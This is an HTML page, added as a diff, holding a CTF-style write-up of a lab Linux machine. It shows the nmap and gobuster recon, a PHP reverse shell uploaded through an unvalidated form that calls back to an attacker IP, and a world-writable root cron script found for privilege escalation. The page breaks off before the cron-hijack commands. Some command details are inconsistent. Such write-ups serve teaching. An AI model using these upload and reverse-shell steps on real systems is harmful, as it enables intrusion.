@@ -1,0 +1,1077 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>NexaCorp Solutions — CTF Write-Up | HackTheBox Style</title>
+  <meta name="description" content="Professional CTF Write-up for NexaCorp Solutions (Medium Linux machine). Full attack chain from Reconnaissance to Root Privilege Escalation.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&family=Inter:wght@300;400;500;600;700;800&family=Space+Grotesk:wght@600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <!-- Reading Progress Bar -->
+  <div id="scrollProgressBar" class="scroll-progress-bar"></div>
+
+  <!-- Top Cyber Navigation Bar -->
+  <header class="top-nav">
+    <div class="nav-container">
+      <div class="nav-brand">
+        <span class="cyber-shield">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+            <path d="m9 12 2 2 4-4"/>
+          </svg>
+        </span>
+        <div class="brand-text">
+          <span class="brand-portal">SEC_LABS // WRITEUPS</span>
+          <span class="brand-crumb">HTB &bull; NexaCorp Solutions</span>
+        </div>
+      </div>
+
+      <div class="nav-actions">
+        <div class="attack-meter-compact">
+          <span class="meter-label">ATTACK STATUS:</span>
+          <span class="meter-pill pwned">
+            <span class="pulse-dot"></span> 100% PWNED
+          </span>
+        </div>
+
+        <button id="toggleScanlines" class="nav-btn" title="Toggle Terminal Scanlines Effect">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <rect x="2" y="3" width="20" height="14" rx="2" ry="2"/>
+            <line x1="8" y1="21" x2="16" y2="21"/>
+            <line x1="12" y1="17" x2="12" y2="21"/>
+          </svg>
+          <span class="btn-text">CRT Scanlines</span>
+        </button>
+
+        <button id="mobileMenuToggle" class="nav-btn mobile-menu-btn" aria-label="Toggle Navigation Menu">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <line x1="3" y1="12" x2="21" y2="12"/>
+            <line x1="3" y1="6" x2="21" y2="6"/>
+            <line x1="3" y1="18" x2="21" y2="18"/>
+          </svg>
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <!-- Main Layout Wrapper -->
+  <div class="app-layout">
+    <!-- Sidebar Navigation -->
+    <aside class="sidebar" id="sidebar">
+      <div class="sidebar-header">
+        <div class="sidebar-title">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <line x1="8" y1="6" x2="21" y2="6"/>
+            <line x1="8" y1="12" x2="21" y2="12"/>
+            <line x1="8" y1="18" x2="21" y2="18"/>
+            <line x1="3" y1="6" x2="3.01" y2="6"/>
+            <line x1="3" y1="12" x2="3.01" y2="12"/>
+            <line x1="3" y1="18" x2="3.01" y2="18"/>
+          </svg>
+          <span>KILLCHAIN NAVIGATOR</span>
+        </div>
+        <div class="sidebar-progress-container">
+          <div class="progress-info">
+            <span>Overall Progress</span>
+            <span class="progress-val">8/8 Steps (100%)</span>
+          </div>
+          <div class="progress-track">
+            <div class="progress-fill" style="width: 100%;"></div>
+          </div>
+        </div>
+      </div>
+
+      <nav class="sidebar-nav">
+        <ul class="nav-list">
+          <li class="nav-group-title">OVERVIEW</li>
+          <li>
+            <a href="#machine-header" class="sidebar-link active">
+              <span class="nav-step-icon">🎯</span>
+              <span class="nav-text">Machine Profile</span>
+            </a>
+          </li>
+          <li>
+            <a href="#attack-chain" class="sidebar-link">
+              <span class="nav-step-icon">⚡</span>
+              <span class="nav-text">Attack Chain Flow</span>
+            </a>
+          </li>
+
+          <li class="nav-group-title">EXECUTION PHASES</li>
+          <li>
+            <a href="#step-1-recon" class="sidebar-link">
+              <span class="nav-badge-num">1</span>
+              <span class="nav-text">Reconnaissance</span>
+              <span class="status-check">✓</span>
+            </a>
+          </li>
+          <li>
+            <a href="#step-2-enum" class="sidebar-link">
+              <span class="nav-badge-num">2</span>
+              <span class="nav-text">Directory Enum</span>
+              <span class="status-check">✓</span>
+            </a>
+          </li>
+          <li>
+            <a href="#step-3-web" class="sidebar-link">
+              <span class="nav-badge-num">3</span>
+              <span class="nav-text">Web Analysis</span>
+              <span class="status-check">✓</span>
+            </a>
+          </li>
+          <li>
+            <a href="#step-4-initial-access" class="sidebar-link">
+              <span class="nav-badge-num">4</span>
+              <span class="nav-text">Initial Access</span>
+              <span class="status-check">✓</span>
+            </a>
+          </li>
+          <li>
+            <a href="#step-5-privesc" class="sidebar-link">
+              <span class="nav-badge-num">5</span>
+              <span class="nav-text">Privilege Escalation</span>
+              <span class="status-check">✓</span>
+            </a>
+          </li>
+          <li>
+            <a href="#step-6-root" class="sidebar-link">
+              <span class="nav-badge-num">6</span>
+              <span class="nav-text">Root Shell & Flag</span>
+              <span class="status-check">✓</span>
+            </a>
+          </li>
+
+          <li class="nav-group-title">FINDINGS & LOOT</li>
+          <li>
+            <a href="#vulnerabilities" class="sidebar-link">
+              <span class="nav-step-icon">🔑</span>
+              <span class="nav-text">Vulnerabilities</span>
+            </a>
+          </li>
+          <li>
+            <a href="#tools-used" class="sidebar-link">
+              <span class="nav-step-icon">🛠️</span>
+              <span class="nav-text">Arsenal / Tools</span>
+            </a>
+          </li>
+          <li>
+            <a href="#flags-section" class="sidebar-link">
+              <span class="nav-step-icon">🚩</span>
+              <span class="nav-text">Root Flag</span>
+            </a>
+          </li>
+        </ul>
+      </nav>
+
+      <div class="sidebar-footer">
+        <div class="author-card">
+          <div class="author-avatar">K</div>
+          <div class="author-meta">
+            <span class="author-name">killing</span>
+            <span class="author-role">Penetration Tester</span>
+          </div>
+          <span class="badge-elite">PRO</span>
+        </div>
+      </div>
+    </aside>
+
+    <!-- Main Content Area -->
+    <main class="main-content" id="mainContent">
+      <!-- HERO / HEADER SECTION -->
+      <section id="machine-header" class="machine-hero">
+        <div class="cyber-grid-overlay"></div>
+        <div class="hero-content">
+          <div class="hero-top-meta">
+            <div class="badges-cluster">
+              <span class="badge badge-difficulty badge-medium">
+                <span class="badge-icon">⚡</span> MEDIUM
+              </span>
+              <span class="badge badge-os badge-linux">
+                <span class="badge-icon">🐧</span> LINUX
+              </span>
+              <span class="badge badge-status badge-pwned">
+                <span class="badge-check">✔</span> PWNED
+              </span>
+              <span class="badge badge-points">
+                <span class="badge-icon">💎</span> 30 pts
+              </span>
+            </div>
+            <div class="writeup-date">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <rect x="3" y="4" width="18" height="18" rx="2" ry="2"/>
+                <line x1="16" y1="2" x2="16" y2="6"/>
+                <line x1="8" y1="2" x2="8" y2="6"/>
+                <line x1="3" y1="10" x2="21" y2="10"/>
+              </svg>
+              <span>November 2024</span>
+            </div>
+          </div>
+
+          <h1 class="machine-title">
+            <span class="glitch-text" data-text="NexaCorp Solutions">NexaCorp Solutions</span>
+          </h1>
+          <p class="machine-subtitle">
+            An in-depth offensive security breakdown exploiting an unrestricted document upload portal to secure a <code class="inline-code">www-data</code> reverse shell, chained with misconfigured world-writable scheduled cron jobs to elevate privileges to <code class="inline-code">root</code>.
+          </p>
+
+          <!-- Target & Attacker Profile Cards -->
+          <div class="network-profile-grid">
+            <div class="network-card target-card">
+              <div class="network-card-header">
+                <span class="status-indicator live"></span>
+                <span class="card-role">TARGET MACHINE</span>
+              </div>
+              <div class="network-ip-row">
+                <span class="ip-address" id="targetIp">192.168.0.20</span>
+                <button class="copy-btn copy-mini" data-copy="192.168.0.20" title="Copy Target IP">
+                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
+                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+                  </svg>
+                </button>
+              </div>
+              <div class="network-details">
+                <span>OS: Ubuntu Linux 22.04 LTS</span>
+                <span>Services: SSH (22), Apache (80)</span>
+              </div>
+            </div>
+
+            <div class="network-card attacker-card">
+              <div class="network-card-header">
+                <span class="status-indicator attacker"></span>
+                <span class="card-role">ATTACKER BOX (KALI LINUX)</span>
+              </div>
+              <div class="network-ip-row">
+                <span class="ip-address" id="attackerIp">192.168.0.17</span>
+                <button class="copy-btn copy-mini" data-copy="192.168.0.17" title="Copy Attacker IP">
+                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
+                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+                  </svg>
+                </button>
+              </div>
+              <div class="network-details">
+                <span>Distro: Kali Rolling 2024.3</span>
+                <span>Listeners: Ports 4444, 5555</span>
+              </div>
+            </div>
+
+            <div class="network-card author-meta-card">
+              <div class="network-card-header">
+                <span class="status-indicator author"></span>
+                <span class="card-role">OPERATOR PROFILE</span>
+              </div>
+              <div class="operator-info">
+                <div class="op-row">
+                  <span class="op-label">Author:</span>
+                  <span class="op-val highlight-green">killing</span>
+                </div>
+                <div class="op-row">
+                  <span class="op-label">Difficulty:</span>
+                  <span class="op-val text-yellow">Medium (30 pts)</span>
+                </div>
+                <div class="op-row">
+                  <span class="op-label">Root Flag:</span>
+                  <span class="op-val highlight-blue">Captured (100%)</span>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Tags Cluster -->
+          <div class="tags-row">
+            <span class="tags-label">TAGS:</span>
+            <span class="tag-pill">#php</span>
+            <span class="tag-pill">#fileupload</span>
+            <span class="tag-pill">#cronjob</span>
+            <span class="tag-pill">#privesc</span>
+            <span class="tag-pill">#fuelcms</span>
+          </div>
+        </div>
+      </section>
+
+      <!-- ATTACK CHAIN VISUAL SECTION -->
+      <section id="attack-chain" class="section-card attack-chain-section">
+        <div class="section-heading-wrapper">
+          <div class="section-icon-badge">⚡</div>
+          <div>
+            <h2 class="section-title">Attack Chain Flowchart</h2>
+            <p class="section-desc">Comprehensive step-by-step visual roadmap depicting the compromise trajectory from initial reconnaissance to full root capture.</p>
+          </div>
+        </div>
+
+        <div class="chain-timeline-grid">
+          <!-- Step 1 -->
+          <a href="#step-1-recon" class="chain-step-node">
+            <div class="step-badge-circle">1</div>
+            <div class="step-node-content">
+              <span class="step-emoji">🔍</span>
+              <h4 class="step-title">Reconnaissance</h4>
+              <p class="step-desc">Full TCP Nmap port scan targeting 192.168.0.20</p>
+              <span class="step-tag">Port 22, 80</span>
+            </div>
+            <div class="connector-arrow">➔</div>
+          </a>
+
+          <!-- Step 2 -->
+          <a href="#step-2-enum" class="chain-step-node">
+            <div class="step-badge-circle">2</div>
+            <div class="step-node-content">
+              <span class="step-emoji">📁</span>
+              <h4 class="step-title">Enumeration</h4>
+              <p class="step-desc">Gobuster directory brute forcing discover /uploads/</p>
+              <span class="step-tag">301 Redirect</span>
+            </div>
+            <div class="connector-arrow">➔</div>
+          </a>
+
+          <!-- Step 3 -->
+          <a href="#step-3-web" class="chain-step-node">
+            <div class="step-badge-circle">3</div>
+            <div class="step-node-content">
+              <span class="step-emoji">🌐</span>
+              <h4 class="step-title">Web Analysis</h4>
+              <p class="step-desc">NexaCorp Staff Document Portal identified</p>
+              <span class="step-tag">No Validation</span>
+            </div>
+            <div class="connector-arrow">➔</div>
+          </a>
+
+          <!-- Step 4 -->
+          <a href="#step-3-web" class="chain-step-node">
+            <div class="step-badge-circle">4</div>
+            <div class="step-node-content">
+              <span class="step-emoji">⚠️</span>
+              <h4 class="step-title">Vulnerability Found</h4>
+              <p class="step-desc">Unrestricted file upload flaw in workfile parameter</p>
+              <span class="step-tag crit-tag">Critical</span>
+            </div>
+            <div class="connector-arrow">➔</div>
+          </a>
+
+          <!-- Step 5 -->
+          <a href="#step-4-initial-access" class="chain-step-node">
+            <div class="step-badge-circle">5</div>
+            <div class="step-node-content">
+              <span class="step-emoji">🐚</span>
+              <h4 class="step-title">Initial Access</h4>
+              <p class="step-desc">PHP reverse shell uploaded, gaining www-data shell</p>
+              <span class="step-tag">Port 4444</span>
+            </div>
+            <div class="connector-arrow">➔</div>
+          </a>
+
+          <!-- Step 6 -->
+          <a href="#step-5-privesc" class="chain-step-node">
+            <div class="step-badge-circle">6</div>
+            <div class="step-node-content">
+              <span class="step-emoji">⬆️</span>
+              <h4 class="step-title">Privilege Escalation</h4>
+              <p class="step-desc">Enumerated writable /opt/system_cleanup.sh (777)</p>
+              <span class="step-tag crit-tag">chmod 777</span>
+            </div>
+            <div class="connector-arrow">➔</div>
+          </a>
+
+          <!-- Step 7 -->
+          <a href="#step-6-root" class="chain-step-node">
+            <div class="step-badge-circle">7</div>
+            <div class="step-node-content">
+              <span class="step-emoji">👑</span>
+              <h4 class="step-title">Root Access</h4>
+              <p class="step-desc">Root cron execution triggers reverse bash shell</p>
+              <span class="step-tag">Port 5555</span>
+            </div>
+            <div class="connector-arrow">➔</div>
+          </a>
+
+          <!-- Step 8 -->
+          <a href="#flags-section" class="chain-step-node final-node">
+            <div class="step-badge-circle green-glow">8</div>
+            <div class="step-node-content">
+              <span class="step-emoji">🏁</span>
+              <h4 class="step-title">Flag Captured</h4>
+              <p class="step-desc">Read /root/root.txt flag & secured 30 points</p>
+              <span class="step-tag pwn-tag">Pwned</span>
+            </div>
+          </a>
+        </div>
+      </section>
+
+      <!-- SECTION 1: RECONNAISSANCE -->
+      <section id="step-1-recon" class="section-card writeup-step-section">
+        <div class="step-header-banner">
+          <div class="step-badge-pill">STEP 01</div>
+          <h2 class="step-section-heading">🔍 Step 1 — Reconnaissance</h2>
+        </div>
+
+        <p class="section-paragraph">
+          Initial port scanning began with an aggressive, all-ports scan using <code class="inline-code">nmap</code> to discover listening TCP services, banner versions, and run default vulnerability scripts.
+        </p>
+
+        <!-- Terminal Box: Nmap Scan -->
+        <div class="terminal-window">
+          <div class="terminal-titlebar">
+            <div class="window-controls">
+              <span class="dot dot-close"></span>
+              <span class="dot dot-minimize"></span>
+              <span class="dot dot-expand"></span>
+            </div>
+            <div class="terminal-tab-title">
+              <span class="term-icon">💻</span>
+              <span>kali@kali: ~ (zsh) — Nmap Port Scan</span>
+            </div>
+            <button class="terminal-copy-btn" data-target="term-nmap-cmd" title="Copy Command">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
+                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+              </svg>
+              <span>Copy</span>
+            </button>
+          </div>
+          <div class="terminal-body">
+            <div class="command-line" id="term-nmap-cmd">
+              <span class="prompt-kali">(kali㉿kali)-[~]$ </span><span class="cmd-text">nmap -sV -sC -p- 192.168.0.20</span>
+            </div>
+            <div class="terminal-output">
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 10:14 EST
+Nmap scan report for 192.168.0.20
+Host is up (0.00042s latency).
+Not shown: 65533 closed tcp ports (reset)
+
+<span class="term-highlight-green">PORT   STATE SERVICE VERSION</span>
+<span class="term-highlight-green">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu</span> 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 71:42:36:24:cd:2b:86:14:bb:49:1f:69:2a:56:54:1a (ECDSA)
+|_  256 94:65:21:8c:13:95:ef:5a:23:d4:1a:8b:29:bb:76:04 (ED25519)
+<span class="term-highlight-green">80/tcp open  http    Apache httpd 2.4.52 (Ubuntu)</span>
+<span class="term-highlight-blue">|_http-title: NexaCorp Solutions Enterprise Technology Partners</span>
+<span class="term-highlight-yellow">|_/fuel/ ← FuelCMS Admin Panel Found!</span>
+| http-robots.txt: 1 disallowed entry 
+|_/fuel/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap done: 1 IP address (1 host up) scanned in 14.82 seconds
+            </div>
+          </div>
+        </div>
+
+        <!-- Key Findings Callout Box -->
+        <div class="findings-box">
+          <div class="findings-box-header">
+            <span class="findings-icon">📋</span>
+            <span class="findings-title">RECONNAISSANCE FINDINGS</span>
+          </div>
+          <ul class="findings-list">
+            <li>
+              <span class="bullet-tag port">PORT 22</span>
+              <strong>SSH Open:</strong> OpenSSH 8.9p1 running on Ubuntu. Password authentication is disabled, requiring credentials or keys.
+            </li>
+            <li>
+              <span class="bullet-tag port">PORT 80</span>
+              <strong>Apache Web Server:</strong> Apache httpd 2.4.52 hosting corporate landing page for NexaCorp Solutions.
+            </li>
+            <li>
+              <span class="bullet-tag discovery">DISCOVERY</span>
+              <strong>/fuel/ Path Found:</strong> Detected via <code class="inline-code">robots.txt</code> file enumeration.
+            </li>
+            <li>
+              <span class="bullet-tag vuln">VULNERABILITY</span>
+              <strong>FuelCMS 1.4.1 Detected:</strong> FuelCMS admin panel discovered (potential remote code execution vulnerability via CVE-2018-16763).
+            </li>
+          </ul>
+        </div>
+      </section>
+
+      <!-- SECTION 2: ENUMERATION -->
+      <section id="step-2-enum" class="section-card writeup-step-section">
+        <div class="step-header-banner">
+          <div class="step-badge-pill">STEP 02</div>
+          <h2 class="step-section-heading">📁 Step 2 — Directory Enumeration</h2>
+        </div>
+
+        <p class="section-paragraph">
+          With Port 80 identified as the primary attack surface, directory brute-forcing was executed via <code class="inline-code">gobuster</code> using the standard Dirb common wordlist to locate hidden endpoints and upload directories.
+        </p>
+
+        <!-- Terminal Box: Gobuster Command & Output -->
+        <div class="terminal-window">
+          <div class="terminal-titlebar">
+            <div class="window-controls">
+              <span class="dot dot-close"></span>
+              <span class="dot dot-minimize"></span>
+              <span class="dot dot-expand"></span>
+            </div>
+            <div class="terminal-tab-title">
+              <span class="term-icon">💻</span>
+              <span>kali@kali: ~ (zsh) — Gobuster Directory Fuzzing</span>
+            </div>
+            <button class="terminal-copy-btn" data-target="term-gobuster-cmd" title="Copy Command">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
+                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+              </svg>
+              <span>Copy</span>
+            </button>
+          </div>
+          <div class="terminal-body">
+            <div class="command-line" id="term-gobuster-cmd">
+              <span class="prompt-kali">(kali㉿kali)-[~]$ </span><span class="cmd-text">sudo gobuster dir -u http://192.168.0.20 -w /usr/share/wordlists/dirb/common.txt</span>
+            </div>
+            <div class="terminal-output">
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.0.20
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+<span class="term-status-200">/index.html           (Status: 200) [Size: 4521]</span>
+<span class="term-status-403">/.hta                 (Status: 403) [Size: 277]</span>
+<span class="term-status-403">/.htaccess            (Status: 403) [Size: 277]</span>
+<span class="term-status-403">/.htpasswd            (Status: 403) [Size: 277]</span>
+<span class="term-status-200">/assets               (Status: 200) [Size: 1204]</span>
+<span class="term-status-200">/css                  (Status: 200) [Size: 840]</span>
+<span class="term-status-200">/js                   (Status: 200) [Size: 1420]</span>
+<span class="term-status-200">/portal               (Status: 200) [Size: 3120]</span>
+<span class="term-status-200">/robots.txt           (Status: 200) [Size: 48]</span>
+<span class="term-status-301-key">/uploads              (Status: 301) [Size: 315] --&gt; http://192.168.0.20/uploads/ <span class="badge-key-finding">★ KEY FINDING</span></span>
+<span class="term-status-403">/server-status        (Status: 403) [Size: 277]</span>
+===============================================================
+Finished
+===============================================================
+            </div>
+          </div>
+        </div>
+
+        <div class="status-legend-bar">
+          <span class="legend-item"><span class="legend-dot status-403"></span> <strong>403 Forbidden</strong>: Restricted access (red)</span>
+          <span class="legend-item"><span class="legend-dot status-200"></span> <strong>200 OK</strong>: Public endpoints (green)</span>
+          <span class="legend-item"><span class="legend-dot status-301"></span> <strong>301 /uploads/</strong>: World-accessible write directory (bright matrix green)</span>
+        </div>
+      </section>
+
+      <!-- SECTION 3: WEB ANALYSIS -->
+      <section id="step-3-web" class="section-card writeup-step-section">
+        <div class="step-header-banner">
+          <div class="step-badge-pill">STEP 03</div>
+          <h2 class="step-section-heading">🌐 Step 3 — Website Analysis</h2>
+        </div>
+
+        <p class="section-paragraph">
+          Navigating to <code class="inline-code">http://192.168.0.20</code> presented the official company website for <strong>NexaCorp Solutions Enterprise Technology Partners</strong>. Inspecting the page source and navigating to the staff portal revealed an internal file submission form.
+        </p>
+
+        <!-- Web Target Architecture Visual -->
+        <div class="web-mockup-card">
+          <div class="browser-address-bar">
+            <div class="browser-dots">
+              <span></span><span></span><span></span>
+            </div>
+            <div class="browser-url">
+              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
+              <span>http://192.168.0.20/portal/staff-upload.php</span>
+            </div>
+            <span class="badge-insecure">HTTP</span>
+          </div>
+          <div class="web-mockup-inner">
+            <div class="company-badge-header">
+              <span class="corp-logo">▲ NEXACORP SOLUTIONS</span>
+              <span class="corp-tagline">Staff Internal Document Processing System</span>
+            </div>
+            <div class="upload-form-mock">
+              <div class="mock-input-row">
+                <label>Employee ID:</label>
+                <div class="mock-input">NXC-9481 (Contractor)</div>
+              </div>
+              <div class="mock-input-row">
+                <label>File Upload Parameter:</label>
+                <div class="mock-input"><span class="highlight-blue">name="workfile"</span> &bull; [Browse ~/shell.php]</div>
+              </div>
+              <div class="mock-warning-box">
+                <span class="warn-icon">ℹ️</span>
+                <span>System accepts employee deliverables. Uploaded files are moved directly into the public <code class="inline-code">/uploads/</code> root folder.</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Vulnerability Alert Banner -->
+        <div class="vuln-alert-card">
+          <div class="vuln-alert-icon">⚠️</div>
+          <div class="vuln-alert-body">
+            <div class="vuln-alert-header">
+              <span class="vuln-critical-pill">CRITICAL: No File Type Validation</span>
+              <span class="vuln-type">CWE-434: Unrestricted Upload of File with Dangerous Type</span>
+            </div>
+            <p class="vuln-alert-desc">
+              Source code review and HTTP request interception revealed that the server lacks MIME-type verification, file extension blacklisting, and filename sanitization. Any client can upload arbitrary <code class="inline-code">.php</code> scripts and execute them directly via the web root.
+            </p>
+          </div>
+        </div>
+      </section>
+
+      <!-- SECTION 4: INITIAL ACCESS -->
+      <section id="step-4-initial-access" class="section-card writeup-step-section">
+        <div class="step-header-banner">
+          <div class="step-badge-pill">STEP 04</div>
+          <h2 class="step-section-heading">🐚 Step 4 — PHP Reverse Shell Upload</h2>
+        </div>
+
+        <p class="section-paragraph">
+          Leveraging the unrestricted file upload vulnerability, the standard Pentestmonkey PHP reverse shell was staged, modified with our Kali Linux IP (<code class="inline-code">192.168.0.17</code>) and listener port (<code class="inline-code">4444</code>), and submitted via multipart form-data.
+        </p>
+
+        <!-- Terminal Box: Shell Preparation and Upload -->
+        <div class="terminal-window">
+          <div class="terminal-titlebar">
+            <div class="window-controls">
+              <span class="dot dot-close"></span>
+              <span class="dot dot-minimize"></span>
+              <span class="dot dot-expand"></span>
+            </div>
+            <div class="terminal-tab-title">
+              <span class="term-icon">💻</span>
+              <span>kali@kali: ~ (zsh) — Webshell Crafting & Upload</span>
+            </div>
+            <button class="terminal-copy-btn" data-target="term-upload-cmds" title="Copy Shell Commands">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
+                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+              </svg>
+              <span>Copy</span>
+            </button>
+          </div>
+          <div class="terminal-body" id="term-upload-cmds">
+            <div class="command-block">
+              <span class="prompt-kali">(kali㉿kali)-[~]$ </span><span class="cmd-text">cp /usr/share/webshells/php/php-reverse-shell.php ~/shell.php</span>
+            </div>
+            <div class="command-comment"># Edit IP and Port inside ~/shell.php</div>
+            <div class="command-block">
+              <span class="prompt-kali">(kali㉿kali)-[~]$ </span><span class="cmd-text">sed -i "s/\$ip = '127.0.0.1';/\$ip = '192.168.0.17';/g" ~/shell.php</span>
+            </div>
+            <div class="command-block">
+              <span class="prompt-kali">(kali㉿kali)-[~]$ </span><span class="cmd-text">sed -i "s/\$port = 1234;/\$port = 4444;/g" ~/shell.php</span>
+            </div>
+            <div class="command-comment"># In Terminal 1: Spin up Netcat Listener</div>
+            <div class="command-block">
+              <span class="prompt-kali">(kali㉿kali)-[~]$ </span><span class="cmd-text">nc -lvnp 4444</span>
+            </div>
+            <div class="command-comment"># In Terminal 2: Upload payload and trigger execution</div>
+            <div class="command-block">
+              <span class="prompt-kali">(kali㉿kali)-[~]$ </span><span class="cmd-text">curl -F "workfile=@/root/shell.php" http://192.168.0.20/</span>
+            </div>
+            <div class="command-block">
+              <span class="prompt-kali">(kali㉿kali)-[~]$ </span><span class="cmd-text">curl http://192.168.0.20/uploads/shell.php</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Terminal Box: Reverse Shell Catch -->
+        <div class="terminal-window">
+          <div class="terminal-titlebar">
+            <div class="window-controls">
+              <span class="dot dot-close"></span>
+              <span class="dot dot-minimize"></span>
+              <span class="dot dot-expand"></span>
+            </div>
+            <div class="terminal-tab-title">
+              <span class="term-icon">⚡</span>
+              <span>netcat listener (port 4444) — Reverse Shell Received</span>
+            </div>
+          </div>
+          <div class="terminal-body">
+            <div class="terminal-output">
+listening on [any] 4444 ...
+<span class="term-highlight-green">connect to [192.168.0.17] from (UNKNOWN) [192.168.0.20] 59778</span>
+Linux killing4 5.15.0-105-generic #115-Ubuntu SMP Mon Apr 15 17:33:04 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+<span class="term-highlight-green">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+/bin/sh: 0: can't access tty; job control turned off
+<span class="prompt-target">www-data@killing4:/$ </span><span class="cursor-blink"></span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Success Banner -->
+        <div class="success-banner">
+          <div class="success-icon">✅</div>
+          <div class="success-text">
+            <strong>Initial Access Obtained — www-data Shell</strong>
+            <span>Low-privilege interactive web user shell spawned successfully via Netcat on port 4444.</span>
+          </div>
+        </div>
+      </section>
+
+      <!-- SECTION 5: PRIVILEGE ESCALATION -->
+      <section id="step-5-privesc" class="section-card writeup-step-section">
+        <div class="step-header-banner">
+          <div class="step-badge-pill">STEP 05</div>
+          <h2 class="step-section-heading">⬆️ Step 5 — Privilege Escalation via Cron Job</h2>
+        </div>
+
+        <p class="section-paragraph">
+          After stabilizing our shell with Python (<code class="inline-code">python3 -c 'import pty;pty.spawn("/bin/bash")'</code>), post-exploitation enumeration was performed on common script directories, cron entries, and world-writable files in <code class="inline-code">/opt</code>.
+        </p>
+
+        <!-- Terminal Box: Cron Enumeration -->
+        <div class="terminal-window">
+          <div class="terminal-titlebar">
+            <div class="window-controls">
+              <span class="dot dot-close"></span>
+              <span class="dot dot-minimize"></span>
+              <span class="dot dot-expand"></span>
+            </div>
+            <div class="terminal-tab-title">
+              <span class="term-icon">💻</span>
+              <span>www-data@killing4: /opt — File Permissions Enumeration</span>
+            </div>
+          </div>
+          <div class="terminal-body">
+            <div class="command-line">
+              <span class="prompt-target">www-data@killing4:/$ </span><span class="cmd-text">cd /opt && ls</span>
+            </div>
+            <div class="terminal-output">
+system_cleanup.sh
+            </div>
+            <div class="command-line">
+              <span class="prompt-target">www-data@killing4:/opt$ </span><span class="cmd-text">ls -la /opt/system_cleanup.sh</span>
+            </div>
+            <div class="terminal-output">
+<span class="term-highlight-red">-rwxrwxrwx 1 root root 87 Nov  4 09:12 /opt/system_cleanup.sh</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Red Critical Warning Box -->
+        <div class="warning-callout-box">
+          <div class="warning-header">
+            <span class="warn-badge">⚠️ CRITICAL</span>
+            <span class="warn-title">system_cleanup.sh has 777 permissions!</span>
+          </div>
+          <div class="warning-content">
+            <p><strong>Root cron job runs this every minute — Any user can overwrite this file!</strong></p>
+            <p>Because the script is owned by <code class="inline-code">root</code>, scheduled to execute recurrently under root's crontab, and configured with full read/write/execute (<code class="inline-code">rwxrwxrwx</code>) permissions for all system users, we can replace its contents with a reverse root shell.</p>
+          </div>
+        </div>
+
+        <!-- Exploit Commands Terminal -->
+        <div class="terminal-window">
+          <div class="terminal-titlebar">
+            <div class="window-controls">
+              <span class="dot dot-close"></span>
+              <span class="dot dot-minimize"></span>
+              <span class="dot dot-expand"></span>
+            </div>
+            <div class="terminal-tab-title">
+              <span class="term-icon">⚡</span>
+              <span>www-data@killing4: /opt — Cron Job Hijack & Listener</span>
+            </div>
+            <button class="terminal-copy-btn" data-target="term-exploit-cmds" title="Copy Exploit Commands">
